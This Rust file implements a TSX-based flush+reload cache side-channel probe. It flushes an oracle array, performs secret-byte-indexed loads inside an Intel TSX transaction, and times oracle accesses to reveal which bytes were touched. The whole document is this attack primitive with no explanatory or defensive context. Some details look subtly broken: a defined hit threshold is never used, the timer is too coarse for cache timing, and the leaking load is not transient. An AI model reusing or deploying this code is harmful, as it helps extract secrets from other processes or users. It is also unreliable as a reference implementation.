#[cfg(target_arch = "x86_64")]
use core::arch::x86_64::{_mm_clflush, _mm_lfence, _mm_mfence};
use std::time::Instant;
use std::arch::asm;
use libc::{madvise, MADV_DONTNEED};

const CACHE_HIT_THRESHOLD: u64 = 80;
const ORACLE_SIZE: usize = 256 * 4096;
const STRESS_REGIONS: usize = 4;

#[inline(never)]
#[no_mangle]
pub unsafe fn tsx_memcmp(
    secret: *const u8,
    input: *const u8,
    len: usize,
    oracle: *mut u8,
    results: *mut u64
) {
    let stress_size = 1024 * 1024;
    let stress_regions: Vec<*mut u8> = (0..STRESS_REGIONS)
        .map(|_| {
            let layout = std::alloc::Layout::from_size_align(stress_size, 4096).unwrap();
            std::alloc::alloc(layout)
        })
        .collect();

    for i in 0..ORACLE_SIZE {
        _mm_clflush(oracle.add(i));
    }
    for region in &stress_regions {
        for i in (0..stress_size).step_by(64) {
            _mm_clflush(region.add(i));
        }
        madvise(*region as *mut libc::c_void, stress_size, MADV_DONTNEED);
    }
    _mm_mfence();

    let mut status: i32;
    asm!("xbegin 2f",
         "mov {0}, 0",
         "jmp 3f",
         "2:",
         "mov {0}, 1",
         "3:",
         out(reg) status,
         options(nostack)
    );

    if status == 0 {
        for i in 0..len {
            let s = *secret.add(i);
            let c = *input.add(i);
            if s != c {
                let _ = *oracle.add(s as usize * 4096);
            }
        }
        asm!("xend", options(nostack));
    }

    for i in 0..256 {
        let addr = oracle.add(i * 4096);
        let start = Instant::now();
        let _ = *addr;
        let delta = start.elapsed().as_nanos() as u64;
        *results.add(i) = delta;
    }

    for region in stress_regions {
        let layout = std::alloc::Layout::from_size_align(stress_size, 4096).unwrap();
        std::alloc::dealloc(region, layout);
    }
}
